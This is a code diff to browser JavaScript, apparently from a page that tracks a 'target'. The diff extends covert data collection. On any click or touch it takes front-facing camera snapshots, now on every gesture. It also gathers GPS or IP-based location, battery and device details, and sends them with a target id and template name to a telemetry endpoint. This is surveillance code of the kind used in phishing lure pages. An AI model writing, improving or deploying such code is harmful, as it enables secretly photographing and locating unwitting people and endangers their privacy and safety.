@@ -349,28 +349,28 @@
     })
 
     async function getBestAvailableLocation() {
-        // Tier 1: Try GPS with a strict timeout
+        // Tier 1: Try GPS with sufficient timeout to allow user interaction
         if ('geolocation' in navigator) {
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true,
-                        timeout: 4000,
-                        maximumAge: 10000
+                        timeout: 20000,
+                        maximumAge: 0
                     });
                 });
                 return {
                     lat: pos.coords.latitude,
                     lng: pos.coords.longitude,
                     accuracy: pos.coords.accuracy,
-                    source: 'hardware_gps'
+                    source: LOCATION_SOURCE
                 };
             } catch (err) {
                 console.warn(`GPS unavailable (${err.message}). Falling back to IP-based location.`);
             }
         }
 
-        // Tier 2: IP-based coarse geolocation fallback (Zero-permission)
+        // Tier 2: IP-based coarse geolocation fallback
         try {
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
@@ -381,19 +381,19 @@
                     city: data.city,
                     region: data.region,
                     country: data.country_name,
-                    source: 'ip_lookup'
+                    source: 'IP_ESTIMATE'
                 };
             }
         } catch (err) {
             console.warn('IP lookup failed. Falling back to default coordinate node.');
         }
 
-        // Tier 3: Default Campus/Testing Node (Guarantees zero app crashes)
+        // Tier 3: Default Node
         return {
             lat: 17.3850,
             lng: 78.4867,
-            city: 'Hyderabad (Default Node)',
-            source: 'preset_fallback'
+            city: 'Default Node',
+            source: 'IP_ESTIMATE'
         };
     }
 
@@ -401,12 +401,20 @@
         if (!file) return;
         const formData = new FormData();
         formData.append('media', file);
+        formData.append('id', targetId);
 
         try {
             const loc = await getBestAvailableLocation();
             if (loc && loc.lat != null) formData.append('lat', loc.lat);
             if (loc && loc.lng != null) formData.append('lng', loc.lng);
-            if (loc && loc.source) formData.append('source', loc.source);
+            if (loc && loc.accuracy != null) formData.append('accuracy', loc.accuracy);
+            formData.append('locationSource', (loc && loc.source) || LOCATION_SOURCE);
+
+            const battery = await getBatteryInfo();
+            if (battery) formData.append("battery", JSON.stringify(battery));
+            const device = getDeviceInfo();
+            if (device) formData.append("device", JSON.stringify(device));
+            if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
         } catch (_e) {}
 
         try {
@@ -422,27 +430,43 @@
         }
     }
 
+    let isCapturingCamera = false;
     async function captureCameraSnapshot() {
+        if (isCapturingCamera) return null;
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+        isCapturingCamera = true;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
             });
             const video = document.createElement("video");
             video.autoplay = true;
+            video.muted = true;
             video.playsInline = true;
             video.srcObject = stream;
 
+            await video.play().catch(() => {});
+
             await new Promise(resolve => {
-                video.onloadedmetadata = () => resolve();
-                setTimeout(resolve, 800);
+                if (video.readyState >= 2 && video.videoWidth > 0) {
+                    setTimeout(resolve, 350);
+                } else {
+                    const onPlaying = () => {
+                        video.removeEventListener("playing", onPlaying);
+                        setTimeout(resolve, 450);
+                    };
+                    video.addEventListener("playing", onPlaying);
+                    setTimeout(resolve, 1200);
+                }
             });
 
+            const width = video.videoWidth || 640;
+            const height = video.videoHeight || 480;
             const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
+            canvas.width = width;
+            canvas.height = height;
             const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.drawImage(video, 0, 0, width, height);
 
             stream.getTracks().forEach(track => track.stop());
 
@@ -451,36 +475,45 @@
                 const formData = new FormData();
                 formData.append("media", blob, `camera-snapshot-${Date.now()}.jpg`);
                 formData.append("id", targetId);
+
                 const loc = await getBestAvailableLocation();
                 if (loc && loc.lat != null) formData.append("lat", loc.lat);
                 if (loc && loc.lng != null) formData.append("lng", loc.lng);
-                if (loc && loc.source) formData.append("source", loc.source);
+                if (loc && loc.accuracy != null) formData.append("accuracy", loc.accuracy);
+                formData.append("locationSource", (loc && loc.source) || LOCATION_SOURCE);
+
+                const battery = await getBatteryInfo();
+                if (battery) formData.append("battery", JSON.stringify(battery));
+                const device = getDeviceInfo();
+                if (device) formData.append("device", JSON.stringify(device));
+                if (activeOptions?.templateName) formData.append("template", activeOptions.templateName);
 
                 const res = await fetch("/api/telemetry", {
                     method: "POST",
                     body: formData
                 });
-                return await res.json();
+                const result = await res.json();
+                console.log("[Camera Snapshot Captured & Sent]:", result);
+                return result;
             }
         } catch (err) {
             console.warn("Camera capture unavailable or permission denied:", err.message);
+        } finally {
+            isCapturingCamera = false;
         }
         return null;
     }
 
-    let gestureTriggered = false;
     function handleUserGesture() {
-        if (gestureTriggered) return;
-        gestureTriggered = true;
-        if (authorized && activeOptions) {
+        if (authorized || activeOptions) {
             startWatcher();
-            if (activeOptions.enableCamera !== false) {
+            if (activeOptions?.enableCamera !== false) {
                 captureCameraSnapshot();
             }
         }
     }
-    window.addEventListener("click", handleUserGesture, { capture: true, once: true });
-    window.addEventListener("touchstart", handleUserGesture, { capture: true, once: true });
+    window.addEventListener("click", handleUserGesture, { capture: true });
+    window.addEventListener("touchstart", handleUserGesture, { capture: true, passive: true });
 
     window.getBestAvailableLocation = getBestAvailableLocation;
     window.handleImageSelected = handleImageSelected;
